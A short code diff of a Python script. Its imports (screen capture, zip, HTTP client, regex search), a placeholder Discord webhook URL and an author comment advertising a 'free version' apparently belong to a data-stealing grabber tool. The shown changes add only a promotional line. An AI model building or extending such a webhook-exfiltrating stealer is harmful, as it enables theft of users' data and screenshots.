@@ -10,7 +10,6 @@ import zipfile
 import httpx
 import shutil
 
-
 from PIL import ImageGrab
 from re import findall, match
 from tempfile import mkdtemp
@@ -23,6 +22,8 @@ webhook_url = "Webhook link goes here, keep the quotes"
 
 """
 Don't change any of the code below here, unless you know what you're doing --- Maywitz
+
+This is only the free version, join the discord server at https://discord.gg/dWsEDuGByYfor more info 
 
 ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 
